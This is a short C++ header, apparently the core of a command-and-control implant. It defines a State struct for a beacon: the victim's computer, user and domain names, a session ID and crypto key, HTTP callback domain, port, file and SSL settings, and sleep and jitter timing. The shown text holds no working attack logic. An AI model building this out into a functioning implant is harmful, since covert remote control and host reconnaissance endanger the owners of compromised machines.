#ifndef _CORE_INCLUDED
#define _CORE_INCLUDED

#include <iostream>
#include "Windows.h"
#include "Config.h"


typedef struct State {

	bool running;

	// info
	std::string cname;
	std::string uname;
	std::string udomain;

	// session stuff
	std::string uuid;
	std::string cryptkey;

	// http callback stuff
	std::string domain;
	std::string port;
	std::string file;
	bool usessl;

	int sleep; // seconds
	int jitter; // %

	HANDLE hConnection;

} State, * PState;


int main();


#endif